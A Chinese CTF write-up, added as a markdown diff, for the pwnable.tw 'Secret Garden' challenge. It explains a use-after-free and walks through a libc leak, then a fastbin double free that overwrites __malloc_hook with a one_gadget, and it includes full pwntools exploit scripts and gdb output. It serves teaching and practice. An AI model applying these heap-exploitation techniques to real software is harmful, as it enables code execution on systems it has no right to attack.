@@ -1,0 +1,828 @@
+# 和媳妇一起学Pwn 之 Secret Garden
+
+> 漏洞点是：存在悬空指针，并且可以被使用，即UAF。其使用的方式是可以继续free。
+
+> 利用方式：本题libc版本为2.23，故可以使用构造FastbinAttack的DoubleFree完成有约束的地址写任意值。题目开启了全部保护，所以首先通过堆排布的手段泄露libc基址。然后通过DoubleFree覆盖libc中的__malloc_hook函数指针为one_gadget，并触发即可getshell。
+
+- 题目地址：https://pwnable.tw/challenge/#12
+
+## 检查
+
+```
+➜  file secretgarden
+secretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped
+➜  checksec secretgarden 
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+```
+
+64位，动态链接，去符号表，保护全开
+
+## 分析
+菜单题：种花，逛花园，扔了花，清理花园，回家。然后仍然是进行一系列的patch加改名。题目的代码稍微有一点点绕
+
+### add
+种花，每朵花会malloc一个大小为0x28的堆块来存储相关信息，并且可以malloc一个任意大小的堆块来存放花的名字。所有花的堆块的地址将会被存到位于bss段的一个地址列表，花园最多能容纳的花是100朵：
+
+```c
+int add()
+{
+  _QWORD *flower; // rbx
+  void *flower_name; // rbp
+  _QWORD *v2; // rcx
+  signed int v3; // edx
+  unsigned int size[9]; // [rsp+4h] [rbp-24h]
+
+  *(_QWORD *)&size[1] = __readfsqword(0x28u);
+  size[0] = 0;
+  if ( total_num > 0x63u )
+    return puts("The garden is overflow");
+  flower = malloc(0x28uLL);
+  *flower = 0LL;
+  flower[1] = 0LL;
+  flower[2] = 0LL;
+  flower[3] = 0LL;
+  flower[4] = 0LL;
+  __printf_chk(1LL, "Length of the name :");
+  if ( (unsigned int)__isoc99_scanf("%u", size) == -1 )
+    exit(-1);
+  flower_name = malloc(size[0]);
+  if ( !flower_name )
+  {
+    puts("Alloca error !!");
+    exit(-1);
+  }
+  __printf_chk(1LL, "The name of flower :");
+  read(0, flower_name, size[0]);
+  flower[1] = flower_name;
+  __printf_chk(1LL, "The color of the flower :");
+  __isoc99_scanf("%23s", flower + 2);
+  *(_DWORD *)flower = 1;
+  if ( list[0] )
+  {
+    v2 = &list[1];
+    v3 = 1;
+    while ( *v2 )
+    {
+      ++v3;
+      ++v2;
+      if ( v3 == 100 )
+        goto LABEL_14;
+    }
+  }
+  else
+  {
+    v3 = 0;
+  }
+  list[v3] = flower;
+LABEL_14:
+  ++total_num;
+  return puts("Successful !");
+}
+```
+
+### show
+遍历list列表，打印现存花的信息
+
+```c
+int show()
+{
+  __int64 v0; // rbx
+  __int64 v1; // rax
+  __int64 v2; // rcx
+  __int64 v3; // rcx
+
+  v0 = 0LL;
+  if ( total_num )
+  {
+    do
+    {
+      v1 = list[v0];
+      if ( v1 && *(_DWORD *)v1 )
+      {
+        v2 = *(_QWORD *)(v1 + 8);
+        __printf_chk(1LL, "Name of the flower[%u] :%s\n");
+        v3 = list[v0];
+        LODWORD(v1) = __printf_chk(1LL, "Color of the flower[%u] :%s\n");
+      }
+      ++v0;
+    }
+    while ( v0 != 100 );
+  }
+  else
+  {
+    LODWORD(v1) = puts("No flower in the garden !");
+  }
+  return v1;
+}
+```
+
+### del
+删除花，清空花存在的标记位，free掉花name的堆块，即在种花时自定义大小的堆块。但是在free前没有检查花的存在位，并且free后未将name字段的指针置空导致存在悬空指针。
+
+```c
+int del()
+{
+  int result; // eax
+  _DWORD *v1; // rax
+  unsigned int v2; // [rsp+4h] [rbp-14h]
+  unsigned __int64 v3; // [rsp+8h] [rbp-10h]
+
+  v3 = __readfsqword(0x28u);
+  if ( !total_num )
+    return puts("No flower in the garden");
+  __printf_chk(1LL, "Which flower do you want to remove from the garden:");
+  __isoc99_scanf("%d", &v2);
+  if ( v2 <= 0x63 && (v1 = (_DWORD *)list[v2]) != 0LL )
+  {
+    *v1 = 0;
+    free(*(void **)(list[v2] + 8LL));
+    result = puts("Successful");
+  }
+  else
+  {
+    puts("Invalid choice");
+    result = 0;
+  }
+  return result;
+}
+```
+
+### clear
+如果花已经被删除，则可以用clear功能free掉对应的那个0x28大小的堆块。
+
+```c
+unsigned __int64 clear()
+{
+  _QWORD *v0; // rbx
+  _DWORD *v1; // rdi
+  unsigned __int64 v3; // [rsp+8h] [rbp-20h]
+
+  v3 = __readfsqword(0x28u);
+  v0 = list;
+  do
+  {
+    v1 = (_DWORD *)*v0;
+    if ( *v0 && !*v1 )
+    {
+      free(v1);
+      *v0 = 0LL;
+      --total_num;
+    }
+    ++v0;
+  }
+  while ( v0 != &list[100] );
+  puts("Done!");
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+### 数据结构
+每朵花的结构如下：0x28的堆块前8个字节是存在位，接下来的8个字节是name堆块的地址，接下来的24个字节保存颜色名字
+
+```
+    bss                                     malloc(0x28)
++----------+                +--------+--------+---------------------------+
+|          |                |        |        |                           |
+|  list[0] +--------------->+  0x1   | &name  |          color            |
+|          |                |        |        |                           |
++----------+                +--------+---+----+---------------------------+
+|          |                             |
+|          |                             v
+|          |                +------------+--------------------------------+
+|          |                |                                             |
+|          |                |          name                               |
+|          |                |                                             |
+|          |                +---------------------------------------------+
+|          |
++----------+
+```
+
+## 漏洞点
+本题的漏洞点就是del函数中，可以对已经删除的花朵的name堆块进行再次的free，而且这个堆块大小可控，所以可以构造FastbinAttack的DoubleFree完成有约束的地址写任意值。
+
+```c
+if ( v2 <= 0x63 && (v1 = (_DWORD *)list[v2]) != 0LL )
+{
+  *v1 = 0;
+  free(*(void **)(list[v2] + 8LL));
+  result = puts("Successful");
+}
+```
+
+## 调试模板
+在利用前，我们发现程序开启了PIE，在调试打断时会有点麻烦，所以设计如下调试模板，参考：
+
+- carlstar
+- n0va-scy
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# local libc
+local_libc_64  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+local_libc_32  = ELF("/lib/i386-linux-gnu/libc.so.6")
+
+# functions for quick script
+s       = lambda data               :io.send(data)       
+sa      = lambda delim,data         :io.sendafter(delim, data) 
+sl      = lambda data               :io.sendline(data) 
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims             :io.recvuntil(delims)
+
+# misc functions
+uu32    = lambda data   :u32(data.ljust(4, b'\0'))
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# one gadget
+one_gadget_16_04_32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
+one_gadget_16_04_64 = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget_18_04_64 = [0x4f2c5,0x4f322,0x10a38c]
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+add(500,"1","1")
+debug(0x107b,"x /100bx "+hex(gdb_libc_base+libc.symbols['__malloc_hook']-0x50))
+add(500,"1","1")
+io.interactive()
+```
+
+## 利用
+
+### 堆排布泄露libc
+因为保护全开，所以我们虽然可以用DoubleFree去修改部分内存，但是不知道写哪，所以先要进行信息泄露。思路仍然是把堆块扔到unsortedbin里，但是因为del花后，存在标记位会被清空，无法去逛花园把信息打印出来，所以还是需要再次申请回来的。并且在种花时时通过read库函数进行名字的输入，并不会在结尾处添加空字符，满足泄露条件。故首先尝试把堆块扔到unsorted bin中：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+
+add(500,"1","1")
+add(10,'2','2')
+rm(0)
+debug(0x107b,'heap chunks\nheap bins')
+show()
+io.interactive()
+```
+
+发现的确成功：
+
+```
+─────────────────── Unsorted Bin for arena '*0x7feca5bbeb20' ───────────────────
+[+] unsorted_bins[0]: fw=0x560898155040, bk=0x560898155040
+ →   Chunk(addr=0x560898155050, size=0x200, flags=PREV_INUSE)
+[+] Found 1 chunks in unsorted bin.
+```
+
+并且当然并不能打印0号花朵的名字信息，所以尝试把这个unsortbin中的堆块在搞出来：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+
+add(500,"1","1")
+add(10,'2','2')
+rm(0)
+add(500,"3","3")
+debug(0x107b,'heap chunks\nheap bins')
+show()
+io.interactive()
+```
+
+发现没有成功，之前在unsorted bin中大小为0x200的堆块不见了，但是在small bin里多了一个大小为0x1d0的堆块。
+
+```
+Chunk(addr=0x557c466fa010, size=0x30, flags=PREV_INUSE)
+    [0x0000557c466fa010     00 00 00 00 00 00 00 00 50 b0 6f 46 7c 55 00 00    ........P.oF|U..]
+Chunk(addr=0x557c466fa040, size=0x1010, flags=PREV_INUSE)
+    [0x0000557c466fa040     33 0a 30 0a 00 00 00 00 00 00 00 00 00 00 00 00    3.0.............]
+Chunk(addr=0x557c466fb050, size=0x30, flags=PREV_INUSE)
+    [0x0000557c466fb050     01 00 00 00 00 00 00 00 a0 b2 6f 46 7c 55 00 00    ..........oF|U..]
+Chunk(addr=0x557c466fb080, size=0x1d0, flags=PREV_INUSE)
+    [0x0000557c466fb080     38 4d b8 bb db 7f 00 00 38 4d b8 bb db 7f 00 00    8M......8M......]
+Chunk(addr=0x557c466fb250, size=0x30, flags=)
+    [0x0000557c466fb250     01 00 00 00 00 00 00 00 80 b2 6f 46 7c 55 00 00    ..........oF|U..]
+Chunk(addr=0x557c466fb280, size=0x20, flags=PREV_INUSE)
+    [0x0000557c466fb280     32 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00    2...............]
+Chunk(addr=0x557c466fb2a0, size=0x200, flags=PREV_INUSE)
+    [0x0000557c466fb2a0     33 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00    3...............]
+Chunk(addr=0x557c466fb4a0, size=0x1fb70, flags=PREV_INUSE)  ←  top chunk
+[+] No Tcache in this version of libc
+────────────────────── Fastbins for arena 0x7fdbbbb84b20 ──────────────────────
+Fastbins[idx=0, size=0x10] 0x00
+Fastbins[idx=1, size=0x20] 0x00
+Fastbins[idx=2, size=0x30] 0x00
+Fastbins[idx=3, size=0x40] 0x00
+Fastbins[idx=4, size=0x50] 0x00
+Fastbins[idx=5, size=0x60] 0x00
+Fastbins[idx=6, size=0x70] 0x00
+─────────────────── Unsorted Bin for arena '*0x7fdbbbb84b20' ───────────────────
+[+] Found 0 chunks in unsorted bin.
+──────────────────── Small Bins for arena '*0x7fdbbbb84b20' ────────────────────
+[+] small_bins[28]: fw=0x557c466fb070, bk=0x557c466fb070
+ →   Chunk(addr=0x557c466fb080, size=0x1d0, flags=PREV_INUSE)
+[+] Found 1 chunks in 1 small non-empty bins.
+──────────────────── Large Bins for arena '*0x7fdbbbb84b20' ────────────────────
+[+] Found 0 chunks in 0 large non-empty bins.
+```
+
+分析原因可知是因为在每次种花之前需要先申请一个0x28大小的堆块，这个请求大小对应的堆块大小就是0x30，所以就先从unsorted bin中的堆块切出0x30大小的堆块，但是再次申请0x200堆块就不够了，所以失败。故解决的办法是先在分配一个0x30大小的堆块然后扔到fastbin中等着被使用：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+add(500,"1","1")
+add(0x28,'2','2')
+add(10,'3','3')
+rm(0);rm(1)
+add(500,"","4")
+debug(0x107b,'heap chunks\nheap bins')
+show()
+io.interactive()
+```
+
+发现unsorted bin的地址以及成功的带到堆块中了：
+
+```
+Chunk(addr=0x5637f8bf7050, size=0x200, flags=PREV_INUSE)
+    [0x00005637f8bf7050     0a 0b ef b5 5a 7f 00 00 78 0b ef b5 5a 7f 00 00    ....Z...x...Z...]
+```
+
+经过调试算出和libc基址的偏移为0x3c3b0a，并和gdb直接的得到的结果进行对比，成功泄露libc基址：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+add(500,"1","1")
+add(0x28,'2','2')
+add(10,'3','3')
+rm(0);rm(1)
+add(500,"","4")
+show();io.recvuntil("flower[3] :")
+libc_addr = uu64(io.recv(6))-0x3c3b0a
+
+leak("libc",libc_addr)
+leak("gdb_libc",gdb_libc_base)
+
+debug(0x107b,'heap chunks\nheap bins')
+show()
+io.interactive()
+```
+
+### 修改__malloc_hook
+因为libc中常利用的函数指针为__malloc_hook和__free_hook，并且题目中的DoubleFree还需要构造size大小合适的伪堆块，所以需要动态调试观察这两个函数指针附近是否可以满足伪堆块的利用条件：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+
+add(500,"1","1")
+add(0x28,'2','2')
+add(10,'3','3')
+rm(0);rm(1)
+add(500,"","4")
+show();io.recvuntil("flower[3] :")
+libc_addr = uu64(io.recv(6))-0x3c3b0a
+leak("libc",libc_addr)
+leak("gdb_libc",gdb_libc_base)
+#debug(0x107b,"x /200bx "+hex(gdb_libc_base+libc.symbols['__free_hook']-0x50))
+debug(0x107b,"x /200bx "+hex(gdb_libc_base+libc.symbols['__malloc_hook']-0x50))
+show()
+io.interactive()
+```
+
+发现__free_hook指针附近全是0，没有可以利用的，而在__malloc_hook附近发现：
+
+```
+0x7faccc5d9af0: 0x60    0x82    0x5d    0xcc    0xac    0x7f    0x00    0x00
+0x7faccc5d9af8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+```
+
+故0x7f经过如下运算是会得到fastbin的索引为5，可以通过判断
+
+```c
+# define PREV_INUSE 0x1
+# define IS_MMAPPED 0x2
+# define NON_MAIN_ARENA 0x4
+# define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+# define chunksize_nomask(p) ((p)->mchunk_size)
+# define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))
+# define fastbin_index(sz)                                                      \
+    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
+
+if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+  {
+    errstr = "malloc(): memory corruption (fast)";
+  errout:
+    malloc_printerr (check_action, errstr, chunk2mem (victim));
+    return NULL;
+}
+```
+
+所以构造的fake chunk就是位于__malloc_hook-0x23处，fastbin索引为5的size为0x70，数据区最多存放0x68即104字节，故尝试劫持控制流：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+
+add(500,"1","1")
+add(0x28,'2','2')
+add(10,'3','3')
+rm(0);rm(1)
+add(500,"","4")
+show();io.recvuntil("flower[3] :")
+libc_addr = uu64(io.recv(6))-0x3c3b0a
+malloc_hook = libc_addr + libc.symbols['__malloc_hook']
+
+fake_chunk = malloc_hook-0x23
+add(104,'1','1')
+add(104,'1','1')
+rm(4);rm(5);rm(4)
+add(104,p64(fake_chunk),'1')
+add(104,'1','1')
+add(104,'1','1')
+add(104,'a'*19+p64(0xdeadbeef),'1')
+debug(0x107b,"x /200bx "+hex(libc_addr+libc.symbols['__malloc_hook']-0x50))
+add(10,'1','1')
+io.interactive()
+```
+
+成功劫持控制流到0xdeadbeef：
+
+```
+$rax   : 0xdeadbeef        
+$rbx   : 0x00007fff0a963930  →  0x0000555a3e3f0a31 ("1\n?>ZU"?)
+$rcx   : 0xffffffda        
+$rdx   : 0x0               
+$rsp   : 0x00007fff0a9638f8  →  0x0000555a3e3fdc6a  →   mov rbx, rax
+$rbp   : 0x0000555a3e3fe408  →   repz cld
+$rsi   : 0x0000555a3e3fdc6a  →   mov rbx, rax
+$rdi   : 0x28              
+$rip   : 0xdeadbeef        
+$r8    : 0x0               
+$r9    : 0x1999999999999999
+$r10   : 0x0               
+$r11   : 0x00007f6f957b2a00  →  0x0002000200020002
+$r12   : 0x0000555a3e3fe2a2  →  "Invalid choice"
+$r13   : 0x00007fff0a963a30  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0   
+```
+
+因为只能去修改__malloc_hook，而malloc函数的参数一般为数值，所以如果基本无法利用system函数，将数值利用成字符串地址，因为一旦有小数值就会产生非法地址访问。最终还是只能选择one_gadget。
+
+### one_gadget利用约束
+
+本题给的libc有如下4个one_gadget：
+
+```
+➜  one_gadget libc_64.so.6 
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xef6c4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf0567 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+进行调试：
+
+```python
+from pwn import *
+
+# challenge information
+context(arch='amd64',os='linux',log_level='debug')
+myelf  = ELF("./secretgarden")
+libc   = ELF("./libc_64.so.6")
+io     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
+
+# functions for quick script
+sla     = lambda delim,data         :io.sendlineafter(delim, data) 
+
+# misc functions
+uu64    = lambda data   :u64(data.ljust(8, b'\0'))
+leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+
+# base addr
+gdb_text_base = int(os.popen("pmap {}| awk ''".format(io.pid)).readlines()[1], 16)
+gdb_libc_base = int(os.popen("pmap {}| grep libc | awk ''".format(io.pid)).readlines()[0], 16)
+
+# debug function
+def debug(addr=0,cmd='',PIE=True):
+    if PIE: addr = gdb_text_base + addr
+    log.warn("breakpoint_addr --> 0x%x" % addr)
+    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
+
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+clear   = lambda                :  (sla("choice : ","4"))
+
+
+add(500,"1","1")
+add(0x28,'2','2')
+add(10,'3','3')
+rm(0);rm(1)
+add(500,"","4")
+show();io.recvuntil("flower[3] :")
+libc_addr = uu64(io.recv(6))-0x3c3b0a
+malloc_hook = libc_addr + libc.symbols['__malloc_hook']
+
+fake_chunk = malloc_hook-0x23
+add(104,'1','1')
+add(104,'1','1')
+rm(4);rm(5);rm(4)
+add(104,p64(fake_chunk),'1')
+add(104,'1','1')
+add(104,'1','1')
+add(104,'a'*19+p64(0xdeadbeef),'1')
+debug(0xc65)
+add(10,'1','1')
+io.interactive()
+```
+
+发现执行到控制流劫持时，没有任何一个one_gadget的约束可以满足
+
+```
+gef➤  x/gx $rsp+0x30
+0x7ffee9751c48: 0x0000557275c260bf
+gef➤  x/gx $rsp+0x50
+0x7ffee9751c68: 0x0000557275c26110
+gef➤  x/gx $rsp+0x70
+0x7ffee9751c88: 0x00007ffee9751d58
+```
+
+最终参考其他的wp，通过两次free同一个chunk触发doublefree的error，这个error字符串的打印最终用到malloc，这个调用malloc的途径满足第三个one_gadget的约束。不过在本地尝试一直不成功，而且甚至两次free都无法控制流劫持。最终直接攻击远程成功，不知为何。
+
+### 最终exp
+
+```python
+from pwn import *
+context(arch='amd64',os='linux',log_level='debug')
+libc   = ELF("./libc_64.so.6")
+io = remote("chall.pwnable.tw",10203) 
+one_gadget = 0xef6c4
+
+sla     = lambda delim,data     :  io.sendlineafter(delim,data)
+add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
+show    = lambda                :  (sla("choice : ","2"))
+rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
+
+# use unsorted bin to leak libc
+add(500,"1","1")
+add(40,"1","1")
+add(10,"1","1")
+rm(1);rm(0)
+add(500,"","1")
+show();io.recvuntil("flower[3] :")
+libc_addr = u64(io.recv(6)+'\x00\x00')-0x3c3b0a
+malloc_hook = libc_addr + libc.symbols['__malloc_hook']
+
+# use fastbin double free attack to modify malloc_hook, the fake chunk addr is found by dynamic debug
+fake_chunk = malloc_hook-0x23
+add(104,'1','1')
+add(104,'1','1')
+rm(4);rm(5);rm(4)
+add(104,p64(fake_chunk),'1')
+add(104,'1','1')
+add(104,'1','1')
+add(104,'a'*19+p64(libc_addr+one_gadget),'1')
+
+# call malloc by using double free error to satisfy one_gadget constraints
+rm(8);rm(8)
+io.interactive()
+```
+
+## 参考
+- pwnable.tw系列
+- pwnable.tw-secretgarden
+- pwnable.tw 11~18题 writeup
+- pwnable.tw中的secretgarden
+
+## 总结
+可见，控制流劫持并不是万事大吉了，还需要研究劫持到哪，劫持到one_gadget后如何挑选路径触发才能满足约束，这些都是要考虑的问题，另外这里给出fastbin的大小的一些关系：
+
+32位：
+
+| gef fastbin item              | chunk size | data interval                         | fake chunk size |
+|------------------------------|-----------|---------------------------------------|-----------------|
+| Fastbins[idx=0, size=0x8]    | 0x10      | [0x01,0x0c] , [1,12]                  | [0x10,0x17]     |
+| Fastbins[idx=1, size=0x10]   | 0x18      | [0x0d,0x14] , [13,20]                 | [0x18,0x1f]     |
+| Fastbins[idx=2, size=0x18]   | 0x20      | [0x15,0x1c] , [21,28]                 | [0x20,0x27]     |
+| Fastbins[idx=3, size=0x20]   | 0x28      | [0x1d,0x24] , [29,36]                 | [0x28,0x2f]     |
+| Fastbins[idx=4, size=0x28]   | 0x30      | [0x25,0x2c] , [37,44]                 | [0x30,0x37]     |
+| Fastbins[idx=5, size=0x30]   | 0x38      | [0x2d,0x34] , [45,52]                 | [0x38,0x3f]     |
+| Fastbins[idx=6, size=0x38]   | 0x40      | [0x35,0x3c] , [53,60]                 | [0x40,0x47]     |
+
+64 位：
+
+| gef fastbin item              | chunk size | data interval                         | fake chunk size |
+|------------------------------|-----------|---------------------------------------|-----------------|
+| Fastbins[idx=0, size=0x10]   | 0x20      | [0x01,0x18] , [1,24]                  | [0x20,0x2f]     |
+| Fastbins[idx=1, size=0x20]   | 0x30      | [0x19,0x28] , [25,40]                 | [0x30,0x3f]     |
+| Fastbins[idx=2, size=0x30]   | 0x40      | [0x29,0x38] , [41,56]                 | [0x40,0x4f]     |
+| Fastbins[idx=3, size=0x40]   | 0x50      | [0x39,0x48] , [57,72]                 | [0x50,0x5f]     |
+| Fastbins[idx=4, size=0x50]   | 0x60      | [0x49,0x58] , [73,88]                 | [0x60,0x6f]     |
